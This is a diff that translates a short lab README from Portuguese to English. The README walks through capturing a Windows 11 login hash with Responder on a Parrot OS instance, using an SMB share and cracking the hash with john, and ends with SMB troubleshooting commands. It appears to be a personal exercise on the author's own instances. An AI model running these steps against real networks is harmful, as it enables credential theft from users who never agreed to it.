@@ -1,6 +1,6 @@
-Retrive password using 'Responder'
+Retrieve password using 'Responder'
 
-### Imagens e Configurações de Instâncias
+### Images and Instance Configurations
 
 - **win11 c5large 65gb**
 - **Parrot OS c5 65gb**
@@ -14,34 +14,35 @@ sudo apt-get install samba
 mkdir /home/parrot/sharefolder
 ```
 
-#### Comando para Partilhar Pasta via SMB
+#### Command to Share Folder via SMB
 
-Para partilhar uma pasta no Parrot OS, execute o seguinte comando:
+To share a folder on Parrot OS, execute the following command:
 
 ```bash
 sudo net usershare add sharefolder /home/parrot/sharefolder "A secret folder shared via SMB" everyone:F guest_ok=y
 ```
-Executar o responder com a interface no "ip a" 
+
+Run Responder with the interface from "ip a":
 ```bash
 sudo responder -I ens5
 ```
 
-#### Acessar Pasta Compartilhada no Windows 11
+#### Access Shared Folder on Windows 11
 
-1. No Windows 11, pressione `Win + R` para abrir o Executar.
-2. Digite `\\[IP_privado_do_Parrot]` e pressione Enter.
+1. On Windows 11, press `Win + R` to open the Run dialog.
+2. Type `\\[Parrot_private_IP]` and press Enter.
 
-> **Nota:** Ao tentar colocar a senha, pode ocorrer um erro e aparecerá o hash no Parrot OS.
+> **Note:** When trying to enter the password, an error may occur, and the hash will appear on Parrot OS.
 
-#### Logs do Responder no Parrot OS
+#### Responder Logs on Parrot OS
 
-Os logs do Responder são armazenados no seguinte diretório:
+Responder logs are stored in the following directory:
 
 ```plaintext
 /usr/share/responder/logs
 ```
 
-Para processar os hashes capturados, utilize o `john`:
+To process the captured hashes, use `john`:
 
 ```bash
 john SMB-xxxxxxxx- TAB
@@ -50,14 +51,14 @@ john SMB-xxxxxxxx- TAB
 
 ### Troubleshooting
 
-Se precisar resolver problemas relacionados ao SMB, use os seguintes comandos:
+If you need to troubleshoot issues related to SMB, use the following commands:
 
-1. Verificar quais processos estão utilizando a porta 445:
+1. Check which processes are using port 445:
     ```bash
     sudo lsof -i :445
     ```
 
-2. Parar o serviço `smbd`:
+2. Stop the `smbd` service:
     ```bash
     sudo systemctl stop smbd
     ```
